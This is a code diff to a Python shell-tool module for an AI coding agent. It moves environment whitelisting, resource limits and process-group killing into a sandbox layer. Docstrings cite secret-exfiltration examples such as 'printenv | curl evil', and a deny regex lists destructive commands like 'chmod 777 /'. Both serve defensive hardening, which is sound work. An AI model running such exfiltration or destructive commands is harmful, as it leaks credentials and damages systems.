@@ -36,11 +36,9 @@ import json
 import os
 import re
 import shlex
-import signal
-import sys
 import time
 from pathlib import Path
-from typing import Any, cast
+from typing import Any
 
 import structlog
 
@@ -49,6 +47,26 @@ from corlinman_agent.coding._common import (
     decode_args,
     resolve_workspace,
     workspace_rel,
+)
+
+# The subprocess confinement helpers moved into :mod:`.environment` (the
+# sandbox seam owns spawning now). They are re-exported here so
+# ``shell.<name>`` keeps resolving for :mod:`.shell_tasks` and existing
+# tests that import them from this module.
+from corlinman_agent.coding.environment import (
+    _build_child_env as _build_child_env,
+)
+from corlinman_agent.coding.environment import (
+    _preexec_apply_rlimits as _preexec_apply_rlimits,
+)
+from corlinman_agent.coding.environment import (
+    get_environment,
+)
+from corlinman_agent.coding.environment import (
+    kill_process_group as kill_process_group,
+)
+from corlinman_agent.coding.environment import (
+    reap_orphan_group as reap_orphan_group,
 )
 
 logger = structlog.get_logger(__name__)
@@ -71,35 +89,6 @@ _MAX_OUTPUT_CHARS = 16_000
 #: stable prefix it can ``read_file`` for the full content.
 _SHELL_LOG_DIR = ".corlinman"
 
-#: POSIX resource limits applied to every spawned shell. Tuned for a
-#: build/test workload (running ``pytest``, ``npm``, ``cargo`` etc.)
-#: while still bounding the blast radius of a runaway command.
-#:
-#: * ``RLIMIT_CPU=60`` — 60 CPU-seconds. The kernel delivers SIGXCPU
-#:   when the soft limit is reached; the SIGKILL at the hard limit
-#:   guarantees termination.
-#: * ``RLIMIT_AS`` — 2 GiB virtual address space cap. Caught by any
-#:   later malloc, so the process fails fast instead of OOMing the host.
-#:   Disabled on macOS where it interacts poorly with dyld.
-#: * ``RLIMIT_FSIZE`` — 100 MiB per-file write cap. A ``dd if=/dev/zero``
-#:   gets ``EFBIG`` rather than filling the disk.
-#: * ``RLIMIT_NPROC=64`` — guards against fork-bomb-style amplification
-#:   from inside the spawned shell.
-#: * ``RLIMIT_NOFILE=256`` — generous enough for normal builds, low
-#:   enough to bound an fd-exhaustion attack.
-_RLIMIT_CPU_SECS = 60
-_RLIMIT_AS_BYTES = 2 * 1024 * 1024 * 1024  # 2 GiB
-_RLIMIT_FSIZE_BYTES = 100 * 1024 * 1024  # 100 MiB
-_RLIMIT_NPROC = 64
-_RLIMIT_NOFILE = 256
-
-#: Whitelist of env vars forwarded to the shell child. The gateway's
-#: process environment carries provider API keys, gRPC credentials, and
-#: hook secrets — those MUST NOT be visible to a model-driven shell.
-#: Only the variables a sane build needs are passed through. Add to
-#: this list with care.
-_ENV_WHITELIST = ("PATH", "LANG", "LC_ALL", "HOME", "USER", "LOGNAME", "TZ")
-
 #: Obvious destructive / privilege patterns refused outright. This is a
 #: tripwire against accidents and the most common adversarial
 #: completions — NOT a security boundary. See module docstring.
@@ -115,141 +104,6 @@ _DENY = re.compile(
     | \bchmod\s+-[a-z]*\s*777\s+/              # chmod 777 /
     """,
 )
-
-
-def _build_child_env() -> dict[str, str]:
-    """Return the env passed to the spawned shell.
-
-    Walks the parent process env and keeps only the
-    :data:`_ENV_WHITELIST` keys. This is the single chokepoint where
-    provider API keys, OAuth tokens, and other secrets are stripped so
-    the model-driven shell cannot ``echo $OPENAI_API_KEY`` or
-    ``printenv | curl evil``.
-    """
-    parent = os.environ
-    env: dict[str, str] = {}
-    for key in _ENV_WHITELIST:
-        if key in parent:
-            env[key] = parent[key]
-    # Bare minimum a shell needs to find binaries; if PATH is missing
-    # the model gets a clear error instead of a silent ``command not
-    # found`` in a weird state.
-    if "PATH" not in env:
-        env["PATH"] = "/usr/local/bin:/usr/bin:/bin"
-    return env
-
-
-def _preexec_apply_rlimits() -> None:
-    """``preexec_fn`` callable: applies :data:`_RLIMIT_*` then ``setsid``.
-
-    Runs in the forked child between ``fork()`` and ``exec()``. ``resource``
-    is POSIX-only — Windows callers skip this hook (we gate on
-    :data:`sys.platform` at the call site).
-
-    Each rlimit is applied independently and best-effort: kernels differ
-    in which limits they implement (macOS's ``RLIMIT_AS`` interacts
-    poorly with dyld; some BSDs lack ``RLIMIT_NPROC``), and the hard
-    limit inherited from the parent may already be lower than the
-    ceiling we'd like to set. Failures on one limit MUST NOT block the
-    spawn — the remaining limits still bound the blast radius.
-
-    ``setsid`` gives the child its own process-group so a timeout can
-    ``killpg`` the whole tree (the shell + every command it forked).
-    Without this, ``proc.kill()`` only kills the shell wrapper and the
-    real workload survives.
-    """
-    import resource
-
-    def _apply(name: str, soft: int, hard: int) -> None:
-        """Best-effort ``setrlimit``: clamp against the current hard
-        limit, swallow per-kernel quirks. Order matters: the CPU limit
-        runs first so a misbehaving caller still gets bounded
-        wall-clock + CPU time.
-        """
-        rlim_id = getattr(resource, name, None)
-        if rlim_id is None:
-            return
-        try:
-            _cur_soft, cur_hard = cast(Any, resource).getrlimit(rlim_id)
-            # Cannot raise hard limit without privilege; respect it.
-            new_hard = (
-                min(hard, cur_hard)
-                if cur_hard != cast(Any, resource).RLIM_INFINITY
-                else hard
-            )
-            new_soft = min(soft, new_hard)
-            cast(Any, resource).setrlimit(rlim_id, (new_soft, new_hard))
-        except (ValueError, OSError):  # type: ignore[attr-defined]
-            # Kernel refused or limit unsupported — every other limit
-            # still applies. Swallow rather than blow the spawn.
-            pass
-
-    _apply("RLIMIT_CPU", _RLIMIT_CPU_SECS, _RLIMIT_CPU_SECS)
-    _apply("RLIMIT_FSIZE", _RLIMIT_FSIZE_BYTES, _RLIMIT_FSIZE_BYTES)
-    # RLIMIT_AS is hostile to macOS dyld; skipped on Darwin. Linux is
-    # fine, and that's where the most realistic deployments live.
-    if sys.platform != "darwin":
-        _apply("RLIMIT_AS", _RLIMIT_AS_BYTES, _RLIMIT_AS_BYTES)
-    _apply("RLIMIT_NPROC", _RLIMIT_NPROC, _RLIMIT_NPROC)
-    _apply("RLIMIT_NOFILE", _RLIMIT_NOFILE, _RLIMIT_NOFILE)
-    # New session — so killpg(getpgid(pid)) reaps the whole process tree.
-    cast(Any, os).setsid()
-
-
-def kill_process_group(proc: asyncio.subprocess.Process) -> None:
-    """Kill the spawned shell AND every command it forked.
-
-    ``proc.kill()`` only delivers SIGKILL to the immediate child (the
-    shell wrapper). If the shell ran ``sleep 9999 &`` or even ``sleep
-    9999`` synchronously, the sleep survives the wrapper's death unless
-    we signal the whole process group. ``setsid`` in the preexec_fn makes
-    the child its own session leader, so ``killpg(getpgid(pid),
-    SIGKILL)`` reaps the whole tree.
-
-    Shared by the foreground timeout path (:func:`dispatch_run_shell`)
-    and the background task registry (:mod:`.shell_tasks`).
-    """
-    if sys.platform == "win32":
-        try:
-            proc.kill()
-        except ProcessLookupError:
-            pass
-        return
-    try:
-        pgid = os.getpgid(proc.pid)
-        os.killpg(pgid, signal.SIGKILL)
-    except (ProcessLookupError, PermissionError):
-        # Already gone, or — for tests where preexec_fn was bypassed —
-        # the child isn't a session leader. Fall back to single-process kill.
-        try:
-            proc.kill()
-        except ProcessLookupError:
-            pass
-
-
-def reap_orphan_group(proc: asyncio.subprocess.Process) -> None:
-    """SIGKILL anything still in ``proc``'s group AFTER the leader exited.
-
-    A command that daemonizes its real work — ``sleep 600 >/dev/null 2>&1
-    &`` — lets the shell leader exit 0 while a child lives on in the same
-    process group. By the time a background task's pump sees the pipe EOF,
-    asyncio's child watcher has already reaped the leader zombie, so
-    ``os.getpgid(proc.pid)`` (what :func:`kill_process_group` calls first)
-    raises ``ProcessLookupError`` and can't find the group. Under
-    ``setsid`` the group id equals the leader's original pid, so we
-    ``killpg(proc.pid, SIGKILL)`` DIRECTLY to reap the survivors — the
-    pgid stays reserved (not recycled) while the group has members, so
-    this targets exactly that group. Best-effort: an already-empty group
-    (the common, no-daemon case) raises ``ProcessLookupError`` and is
-    swallowed. Keeps daemonized children inside the task lifecycle
-    (watchdog / kill controls) instead of escaping as true orphans.
-    """
-    if sys.platform == "win32":
-        return
-    try:
-        os.killpg(proc.pid, signal.SIGKILL)
-    except (ProcessLookupError, PermissionError):
-        pass
 
 
 #: Splits a command line into top-level segments on shell operators so a
@@ -447,7 +301,10 @@ async def dispatch_run_shell(
             )
         except ShellTaskQuotaExceeded as exc:
             return json.dumps({"command": command, "error": f"shell_tasks_busy: {exc}"})
-        except OSError as exc:
+        except (OSError, RuntimeError) as exc:
+            # OSError: the subprocess failed to spawn. RuntimeError: an unknown
+            # sandbox backend from the selector. Both fold into a spawn_failed
+            # envelope so the background path also never raises.
             return json.dumps({"command": command, "error": f"spawn_failed: {exc}"})
         return json.dumps(
             {
@@ -467,27 +324,21 @@ async def dispatch_run_shell(
 
     ws = resolve_workspace(workspace)
 
-    # POSIX-only: apply rlimits + setsid before exec. Skipped on Windows
-    # (CPython's ``preexec_fn`` is POSIX-only); the workspace + env
-    # whitelist still provide some confinement there.
-    spawn_kwargs: dict[str, Any] = {
-        "cwd": str(ws),
-        "stdout": asyncio.subprocess.PIPE,
-        "stderr": asyncio.subprocess.STDOUT,
-        "env": _build_child_env(),
-    }
-    if sys.platform != "win32":
-        spawn_kwargs["preexec_fn"] = _preexec_apply_rlimits
-
+    # Spawn through the sandbox seam (:func:`get_environment`). The local
+    # default reproduces the historical spawn (workspace cwd, env whitelist,
+    # POSIX rlimits + setsid). A spawn failure (``OSError``) or an unknown
+    # backend (``RuntimeError`` from the selector) both fold into the
+    # ``spawn_failed`` envelope — the dispatcher never raises.
     try:
-        proc = await asyncio.create_subprocess_shell(command, **spawn_kwargs)
-    except OSError as exc:
+        handle = await get_environment().spawn_shell(command, workspace=ws)
+    except (OSError, RuntimeError) as exc:
         return json.dumps({"command": command, "error": f"spawn_failed: {exc}"})
+    proc = handle.proc
 
     try:
         stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=timeout)
     except TimeoutError:
-        kill_process_group(proc)
+        handle.kill()
         try:
             await proc.wait()
         except ProcessLookupError:  # pragma: no cover — race
